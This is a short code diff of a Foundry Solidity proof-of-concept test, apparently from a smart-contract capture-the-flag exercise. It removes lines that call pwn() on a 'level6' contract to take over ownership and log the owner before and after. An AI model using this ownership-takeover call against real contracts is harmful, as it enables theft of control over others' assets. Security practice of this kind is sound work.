@@ -10,10 +10,6 @@ contract POC is Test {
     function test() external {
         vm.startBroadcast();
         
-        console.log("Current owner is: ", level6.owner());
-        (bool success, ) = address(level6).call(abi.encodeWithSignature("pwn()"));
-        assertEq(success, true);
-        console.log("New owner is :", level6.owner());
         
         vm.stopBroadcast();
     }
